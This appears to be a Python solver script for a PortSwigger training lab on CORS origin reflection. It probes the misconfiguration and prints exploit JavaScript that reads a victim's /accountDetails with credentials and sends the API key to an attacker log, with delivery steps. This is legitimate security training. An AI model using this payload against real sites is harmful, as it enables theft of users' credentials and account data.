# Lab 01 — CORS vulnerability with basic origin reflection
# PortSwigger: https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack
#
# Vulnerability: /accountDetails reflects ANY Origin header value back in
#                Access-Control-Allow-Origin, with Access-Control-Allow-Credentials: true
# Aim:           Steal the administrator's API key
#
# Technique:
#   The server trusts every origin — it just reflects back whatever you send
#   in the Origin header. Combined with Access-Control-Allow-Credentials:
#   true, any attacker-controlled page can make a credentialed cross-origin
#   request to /accountDetails and read the response in JavaScript.
#
#   This script PROBES the misconfiguration directly with `requests` (which
#   never enforces CORS, so we can read the response regardless — exactly
#   like Burp Repeater would), then prints the exploit HTML/JS that a real
#   victim browser would need to actually exfiltrate the key cross-origin.
#
# Usage: python cors_lab01.py <url>

import sys
import urllib3
from proxies import proxies
from cors_utils import banner, section, make_session, login, probe_origin, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 01 — CORS: BASIC ORIGIN REFLECTION")

    if len(sys.argv) != 2:
        print("  Usage: python cors_lab01.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    if not login(session, url):
        sys.exit(1)

    # ── Step 1: confirm our own API key is returned normally ────────────────
    print("\n  ── Step 1: confirm /accountDetails returns our own API key\n")
    r_own = session.get(f"{url}/accountDetails")
    print_box("Our own /accountDetails response", r_own.text[:300])

    # ── Step 2: probe with an arbitrary Origin header ────────────────────────
    print("  ── Step 2: probe /accountDetails with an arbitrary Origin header\n")
    result = probe_origin(session, f"{url}/accountDetails", "https://example.com")

    if not (result["reflected"] and result["credentials"]):
        print("\n  ✘  Origin reflection or credentials support not confirmed.")
        print("     Inspect the response headers manually — the lab instance")
        print("     may behave slightly differently.")
        sys.exit(1)

    print("\n  ✔  Confirmed: arbitrary Origin reflected, credentials allowed.")
    print("     Any attacker-controlled page could read this response in a")
    print("     real victim's browser.\n")

    # ── Step 3: print the exploit for delivery via the exploit server ───────
    section("Step 3: Exploit HTML/JS for the exploit server")

    exploit = f"""\
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','{url}/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {{
    location = '/log?key=' + this.responseText;
}}
</script>"""

    print_box("EXPLOIT SERVER BODY", exploit)

    print("  ➜  Steps:")
    print("     1. Go to the exploit server")
    print("     2. Paste the script above into the Body field")
    print("     3. Click 'Store', then 'View exploit' to test on yourself")
    print("     4. Click 'Deliver exploit to victim'")
    print("     5. Check the exploit server's access log for the leaked API key")
    print()
    print("  ℹ  req.withCredentials = true is the critical line — without it,")
    print("     the victim's session cookie would never be sent cross-origin,")
    print("     and the response would contain no sensitive data at all.")
